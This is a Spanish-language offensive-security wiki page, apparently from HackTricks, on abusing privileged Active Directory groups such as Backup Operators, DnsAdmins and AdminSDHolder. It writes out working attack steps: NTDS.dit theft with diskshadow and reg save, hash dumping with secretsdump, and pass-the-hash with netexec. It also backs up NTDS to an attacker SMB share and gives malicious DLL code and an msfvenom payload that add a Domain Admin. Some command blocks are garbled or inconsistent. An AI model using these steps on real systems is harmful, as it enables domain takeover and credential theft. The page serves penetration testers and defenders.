# Grupos privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos bien conocidos con privilegios de administración

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo tiene facultad para crear cuentas y grupos que no son administradores en el dominio. Además, permite el inicio de sesión local en el Controlador de Dominio (DC).

Para identificar a los miembros de este grupo, se ejecuta el siguiente comando:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Se permite agregar nuevos usuarios, así como el inicio de sesión local en el DC.

## Grupo **AdminSDHolder**

La Access Control List (ACL) del grupo **AdminSDHolder** es crucial, ya que establece los permisos para todos los "grupos protegidos" dentro de Active Directory, incluidos los grupos de alto privilegio. Este mecanismo asegura la protección de estos grupos evitando modificaciones no autorizadas.

Un atacante podría explotar esto modificando la ACL del grupo **AdminSDHolder**, concediendo permisos completos a un usuario estándar. Esto daría efectivamente a ese usuario control total sobre todos los grupos protegidos. Si los permisos de ese usuario se modificaran o eliminaran, se restablecerían automáticamente en el plazo de una hora debido al diseño del sistema.

Los comandos para revisar los miembros y modificar permisos incluyen:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Un script está disponible para agilizar el proceso de restauración: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para más detalles, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

La pertenencia a este grupo permite la lectura de objetos de Active Directory eliminados, lo que puede revelar información sensible:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Acceso al Controlador de Dominio

El acceso a los archivos en el DC está restringido a menos que el usuario forme parte del grupo `Server Operators`, lo que cambia el nivel de acceso.

### Escalada de privilegios

Usando `PsService` o `sc` de Sysinternals, se pueden inspeccionar y modificar los permisos de los servicios. El grupo `Server Operators`, por ejemplo, tiene control total sobre ciertos servicios, lo que permite la ejecución de comandos arbitrarios y la escalada de privilegios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` tienen acceso completo, lo que permite la manipulación de servicios para obtener privilegios elevados.

## Backup Operators

La pertenencia al grupo `Backup Operators` proporciona acceso al sistema de archivos `DC01` debido a los privilegios `SeBackup` y `SeRestore`. Estos privilegios permiten el recorrido de directorios, el listado y la capacidad de copiar archivos, incluso sin permisos explícitos, usando la bandera `FILE_FLAG_BACKUP_SEMANTICS`. Es necesario utilizar scripts específicos para este proceso.

Para listar los miembros del grupo, ejecuta:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque local

Para aprovechar estos privilegios localmente, se emplean los siguientes pasos:

1. Importar las librerías necesarias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Habilitar y verificar `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acceder y copiar archivos desde directorios restringidos, por ejemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

El acceso directo al sistema de archivos del controlador de dominio permite el robo de la base de datos `NTDS.dit`, que contiene todos los hashes NTLM de los usuarios y equipos del dominio.

#### Using diskshadow.exe

1. Crear una shadow copy del disco `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copiar `NTDS.dit` desde la shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, usa `robocopy` para copiar archivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraer `SYSTEM` y `SAM` para la recuperación de hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recuperar todos los hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Después de la extracción: Pass-the-Hash a DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Usando wbadmin.exe

1. Configura un sistema de archivos NTFS para el servidor SMB en la máquina atacante y almacena en caché las credenciales SMB en la máquina objetivo.
2. Usa `wbadmin.exe` para el respaldo del sistema y la extracción de `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para una demostración práctica, ver [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Los miembros del grupo **DnsAdmins** pueden explotar sus privilegios para cargar una DLL arbitraria con privilegios SYSTEM en un servidor DNS, que a menudo se aloja en controladores de dominio. Esta capacidad permite un potencial de explotación significativo.

Para listar los miembros del grupo DnsAdmins, usa:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidad permite la ejecución de código arbitrario con privilegios SYSTEM en el servicio DNS (generalmente dentro de los DCs). Este problema se solucionó en 2021.

Los miembros pueden hacer que el servidor DNS cargue una DLL arbitraria (ya sea localmente o desde un recurso compartido remoto) usando comandos como:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar el servicio DNS (lo que puede requerir permisos adicionales) es necesario para que la DLL se cargue:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para más detalles sobre este vector de ataque, consulta ired.team.

#### Mimilib.dll

También es factible usar mimilib.dll para la ejecución de comandos, modificándola para ejecutar comandos específicos o reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### Registro WPAD para MitM

DnsAdmins puede manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) creando un registro WPAD después de deshabilitar la lista global de bloqueo de consultas. Herramientas como Responder o Inveigh pueden usarse para spoofing y para capturar tráfico de red.

### Event Log Readers
Los miembros pueden acceder a los registros de eventos, potencialmente encontrando información sensible como contraseñas en texto plano o detalles de la ejecución de comandos:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Este grupo puede modificar las DACLs en el objeto de dominio, potencialmente concediendo privilegios DCSync. Técnicas para privilege escalation que explotan este grupo están detalladas en el repositorio Exchange-AD-Privesc de GitHub.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Los Hyper-V Administrators tienen acceso total a Hyper-V, lo que puede explotarse para obtener control sobre Domain Controllers virtualizados. Esto incluye clonar DCs en vivo y extraer NTLM hashes del archivo NTDS.dit.

### Exploitation Example

El Mozilla Maintenance Service de Firefox puede ser explotado por Hyper-V Administrators para ejecutar comandos como SYSTEM. Esto implica crear un hard link a un archivo protegido de SYSTEM y reemplazarlo con un ejecutable malicioso:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Nota: Hard link exploitation ha sido mitigado en actualizaciones recientes de Windows.

## Group Policy Creators Owners

Este grupo permite a sus miembros crear Group Policies en el dominio. Sin embargo, sus miembros no pueden aplicar Group Policies a usuarios o grupos ni editar GPOs existentes.

## Organization Management

En entornos donde se despliega **Microsoft Exchange**, un grupo especial conocido como **Organization Management** posee capacidades importantes. Este grupo tiene privilegios para **acceder a los buzones de correo de todos los usuarios del dominio** y mantiene **control total sobre la Unidad Organizativa (OU) 'Microsoft Exchange Security Groups'**. Este control incluye el grupo **`Exchange Windows Permissions`**, que puede ser explotado para privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Los miembros del grupo **Print Operators** cuentan con varios privilegios, incluido **`SeLoadDriverPrivilege`**, que les permite iniciar sesión localmente en un Domain Controller, apagarlo y administrar impresoras. Para explotar estos privilegios, especialmente si **`SeLoadDriverPrivilege`** no es visible en un contexto sin elevación, es necesario eludir User Account Control (UAC).

Para listar los miembros de este grupo, se utiliza el siguiente comando de PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Para obtener técnicas de explotación más detalladas relacionadas con **`SeLoadDriverPrivilege`**, consulte recursos de seguridad específicos.

#### Remote Desktop Users

Los miembros de este grupo tienen acceso a equipos mediante el Protocolo de Escritorio Remoto (RDP). Para enumerar a estos miembros, están disponibles comandos de PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Más información sobre la explotación de RDP puede encontrarse en recursos dedicados de pentesting.

#### Remote Management Users

Los miembros pueden acceder a PCs a través de **Windows Remote Management (WinRM)**. La enumeración de estos miembros se realiza mediante:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para técnicas de explotación relacionadas con **WinRM**, se debe consultar la documentación específica.

#### Operadores de Servidor

Este grupo tiene permisos para realizar varias configuraciones en los controladores de dominio, incluidos privilegios de copia de seguridad y restauración, cambiar la hora del sistema y apagar el sistema. Para enumerar los miembros, el comando proporcionado es:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referencias <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
